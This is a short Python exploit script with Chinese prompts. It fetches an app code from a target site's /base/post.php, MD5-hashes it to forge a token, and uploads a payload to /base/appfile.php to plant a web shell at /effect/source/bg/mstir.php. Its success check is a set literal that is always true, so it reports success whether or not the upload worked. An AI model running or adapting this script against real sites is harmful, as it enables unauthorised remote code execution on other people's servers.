# -*- coding: UTF-8 -*- #
import os
import requests
import hashlib

bdlj = os.getcwd()
headers = open(bdlj+"\headers.txt",'r')
headerss = headers.read()
print('\b')

ur = input("请输入目标网址:")
requrl =  ur + '/base/post.php'
reqdata = {"act":"appcode"}
r = requests.post(requrl,data=reqdata)
cz=r.text[2:34]
print ('初值:' + cz)

cz=r.text[2:34]+"a"
m = hashlib.md5()
b = cz.encode(encoding='utf-8')
m.update(b)
zz = m.hexdigest()
print ('终值:' + zz)

infile = open(bdlj + "\datas.txt", "r",encoding='utf-8')
outfile = open(bdlj + "\datah.txt", "w",encoding='utf-8')
for line in infile:
      outfile.write(line.replace('156as1f56safasfasfa', zz))
infile.close()
outfile.close()
datas = open(bdlj+"\datah.txt",'r')
datass = datas.read()

gs = requests.post(ur + '/base/appfile.php',data=datass,headers={'Content-Type':headerss})
gs.encoding = 'utf-8'
print (gs.text)

if {gs.text == "OK"}:
	print ("Getshell成功! Shell:" + ur + "/effect/source/bg/mstir.php")
else:
	print ("Getsehll失败!")